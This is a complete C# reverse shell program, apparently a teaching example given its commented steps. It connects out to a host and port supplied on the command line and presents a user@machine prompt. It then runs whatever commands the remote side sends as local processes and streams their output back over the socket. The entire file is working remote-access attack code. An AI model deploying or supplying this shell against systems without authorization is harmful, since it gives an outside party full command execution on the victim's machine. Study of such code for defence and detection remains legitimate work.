using System;
using System.Net.Sockets;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Text;

class Program {
    static void Main(string[] args) {
        if (args.Length < 2) {
            throw new ArgumentException("Usage: executable host-to-connect port-number");
        }

        using (var tcp = new TcpClient()) {
            // connect to the tcp server
            Console.WriteLine("[+] Connecting to tcp://{0}:{1}", args[0], args[1]);
            tcp.Connect(args[0], Convert.ToInt32(args[1]));

            // get tcp stream
            // this is used to send / recieve data
            Console.WriteLine("[!] Getting base stream");
            using (var stream = tcp.GetStream()) {
                // specifically getting reader stream
                // this is a higher api encapsulating the low level stream function and provide more functionality
                Console.WriteLine("[!] Creating stream reader from base stream");
                using (var rdr = new StreamReader(stream)) {
                    while (true) {
                        var prompt = Encoding.ASCII.GetBytes(string.Format("{0}@{1} $ ", Environment.UserName, Environment.MachineName));
                        stream.Write(prompt, 0, prompt.Length);

                        // wait for the text from server
                        string cmd = rdr.ReadLine().Trim().ToLower();

                        // safeguard user input
                        if (cmd == "exit") {
                            break;
                        } else if (string.IsNullOrEmpty(cmd) || string.IsNullOrWhiteSpace(cmd)) {
                            continue;
                        }

                        // get file name to execute
                        // and its arguments
                        string[] parts = cmd.Split(' ');
                        string fileName = parts.First();
                        string[] fileArgs = parts.Skip(1).ToArray();

                        Console.WriteLine("[+] Executing '{0}'", cmd);

                        // instantiate process
                        var process = new Process {
                            StartInfo = new ProcessStartInfo {
                                FileName = fileName,
                                Arguments = string.Join(" ", fileArgs),
                                UseShellExecute = false,
                                RedirectStandardError = true,
                                RedirectStandardOutput = true,

                            }
                        };

                        // start process and handle IO
                        try {
                            process.Start();

                            // copying the stderr and stdout to network stream
                            process.StandardOutput.BaseStream.CopyTo(stream);
                            process.StandardError.BaseStream.CopyTo(stream);

                            process.WaitForExit();
                        } catch (Exception e) {
                            Console.WriteLine("[x] Error executing '{0}'", cmd);
                            var message = Encoding.ASCII.GetBytes(e.Message + "\r\n");
                            stream.Write(message, 0, message.Length);
                        }


                    }

                    // close the reader stream
                    Console.WriteLine("[!] Closing the reader stream");
                    rdr.Close();
                }

                // close the base stream
                Console.WriteLine("[!] Closing the base stream");
                stream.Close();
            }

            // close the tcp connection
            Console.WriteLine("[+] Closing TCP Connection");
            tcp.Close();
        }
    }
}
